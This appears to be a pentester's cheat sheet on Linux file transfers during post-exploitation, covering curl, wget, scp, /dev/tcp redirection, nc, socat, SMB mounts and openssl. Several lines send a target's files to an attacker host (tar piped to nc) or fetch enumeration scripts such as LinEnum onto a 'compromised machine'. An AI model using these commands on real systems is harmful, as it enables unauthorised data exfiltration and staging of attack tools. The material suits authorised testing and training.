# Linux File Transfers


## Utilities

```bash
curl http://$IP/$file -o $file
wget http://$IP/$file
```

`scp` from [[SSH-Cheatsheet]]
```bash
# Copy a local file to remote host 
scp <file> <user>@<host>:<dest>

# dump user directory with wildcard *
scp -i id_rsa user@10.10.10.10:* . 

# To copy a file from a remote server to your local machine:
scp -P $portnumber <user>@<host>:<src> <dest>

# To scp a file over a SOCKS proxy on localhost and port 9999 (see ssh for tunnel setup):
scp -o "ProxyCommand nc -x 127.0.0.1:9999 -X 4 %h %p" <file> <user>@<host>:<dest>

# To scp between two remote servers from the third machine:
scp -3 <user>@<host1>:<src> <user>@<host2>:<dest>
```

## Bash Redirection

Check `mount` if /`dev/shm/` has `no exec`, this is just an example
```bash
# Use nc to serve the file
nc -lvnp 80 < LinEnum.sh
# Target machine
mount | grep shm
bash -c "cat < /dev/tcp/$IP/$PORT > /dev/shm/LinEnum.sh"
```
[Ippsec Reddish Video](https://www.youtube.com/watch?v=Yp4oxoQIBAM)

## `ncat` | `nc`

Target machine
```bash
tar cf - . | nc $IP $PORT
```
Attack machine
```bash
ncat -nlvp $PORT | tar xf -
```

## `socat`

Use [[Socat]], Host with:
```bash
sudo socat TCP4-LISTEN:$PORT,fork file:$filename
```
Transfer with
```powershell
socat TCP4:$IP:$PORT file:$filename,create
```


## SMB Cif-Utils

```shell
sudo mount -t cifs -o 'user=$username,password=$password' //$IP/share /mnt/sharename
```

[Kali Cif-Utils](https://www.kali.org/tools/cifs-utils/)

## `openssl`

[GTFOBINS upload and download](https://gtfobins.github.io/#+file%20upload%20+file%20download)
```bash
# Create Certificate in our attack machine
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
# Stand up the Server in our attack machine
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
# Download File from the Compromised Machine
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## References

[Ippsec Reddish Video](https://www.youtube.com/watch?v=Yp4oxoQIBAM)
[Kali Cif-Utils](https://www.kali.org/tools/cifs-utils/)
[csbygb.gitbook.io/pentips File Transfers](https://csbygb.gitbook.io/pentips/post-exploitation/file-transfers) 